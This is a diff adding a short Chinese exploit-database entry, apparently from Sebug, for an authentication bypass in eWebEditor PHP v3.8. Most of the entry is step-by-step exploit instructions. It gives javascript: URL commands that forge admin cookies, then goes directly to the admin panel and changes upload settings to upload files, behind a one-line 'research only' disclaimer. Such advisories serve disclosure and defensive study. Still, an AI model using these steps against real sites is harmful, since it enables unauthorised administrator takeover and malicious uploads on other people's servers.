@@ -1,0 +1,10 @@
+php v3.8  asp v2.8
+漏洞描述:eWebEditor是一个所见即所得的在线编辑器。顾名思义，就是能在网络上使用所见即所得的编辑方式进行编辑图文并茂的文章、新闻、讨论贴、通告、记事等多种文字处理应用。
+
+../ewebeditor/admin/config.php文件
+用户认证方式存在严重的安全漏洞，可以直接跳过认证获取到管理员权限。<* 参考
+http://hi.baidu.com/smc2816/blog/item/b1dc4f54485116ceb645ae27.html
+*>
+测试方法:@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!
+1.首先当然要找到登陆后台,默认是../eWebEditor/admin/login.php,进入后台后随便输入一个用户和密码,当然会提示出错了.2.这时候你清空浏览器的url,然后输入 3.javascript:alert(document.cookie="adminuser="+escape("admin")); 4.javascript:alert(document.cookie="adminpass="+escape("admin")); 5.javascript:alert(document.cookie="admindj="+escape("1"));6.后三次回车,清空浏览器的 url,大家注意了,这次输入的url要注意,我们这次要输入的文件都是在正常情况下经过验证才能浏览的文件如../ewebeditor/admin /default.php7.哈哈,直接进去了,利用和asp一样,新增样式修改上传,就ok了
